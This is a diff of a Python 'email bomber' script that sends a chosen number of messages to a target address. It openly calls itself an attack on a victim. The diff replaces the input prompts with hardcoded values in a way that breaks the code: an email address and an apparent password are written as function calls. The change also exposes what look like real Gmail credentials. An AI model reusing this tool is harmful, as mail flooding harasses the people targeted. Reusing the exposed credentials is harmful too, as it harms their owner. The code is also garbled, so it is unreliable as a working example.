@@ -8,11 +8,11 @@ print ("\033[1;31m|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|__
 print ("\033[1;31m|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    \033[1;m")
 
 try:
-    bomb_email = input("Enter Email address on Whom you want to perfom this attack: ")
-    email = input("Enter your gmail_address:")
-    password = input("Enter your gmail_password:")
-    message = input("Enter Message:")
-    counter = int(input("How many message you want to send?:"))
+    bomb_email = dhruvsahnixyz@gmail.com("Enter Email address on Whom you want to perfom this attack: ")
+    email = dhruvsahnixyz@gmail.com("Enter your gmail_address:")
+    password = anshpari132("Enter your gmail_password:")
+    message = test("Enter Message:")
+    counter = int(100("How many message you want to send?:"))
 
     for x in range(0,counter):
         print("Number of Message Sent : ", x+1)
